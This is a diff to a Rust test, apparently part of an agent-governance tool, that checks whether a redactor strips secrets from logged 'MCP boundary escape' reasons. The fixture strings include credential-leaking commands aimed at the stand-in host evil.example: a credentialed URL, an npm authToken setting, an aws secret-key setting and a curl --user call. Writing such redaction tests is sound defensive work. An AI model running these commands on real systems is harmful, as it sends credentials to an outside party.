@@ -2088,9 +2088,20 @@ mod tests {
             "redirected to https://bot:ghp_core1569MCPsecret@evil.example/x",
         )
         .unwrap();
+        // (core#1577) …and so are the shapes the redactor used to miss (built at run time).
+        let v = format!("core1577mcp{}", "Z9".repeat(5));
+        for reason in [
+            format!("redirected to https://{v}@evil.example/x"),
+            format!("npm config set //evil.example/:_authToken {v}"),
+            format!("aws configure set aws_secret_access_key {v}"),
+            format!("curl --user \\\n bot:{v} https://evil.example"),
+        ] {
+            record_mcp_boundary_escape(&token.value, "mcp:jira/get_issue", &reason).unwrap();
+        }
         let raw = std::fs::read_to_string(&dpath).unwrap();
         assert!(!raw.contains("ghp_core1569MCPsecret"), "{raw}");
         assert!(raw.contains("https://***@evil.example/x"), "{raw}");
+        assert!(!raw.contains(&v), "{raw}");
         let _ = std::fs::remove_dir_all(gov_run_dir(&run_id));
     }
 
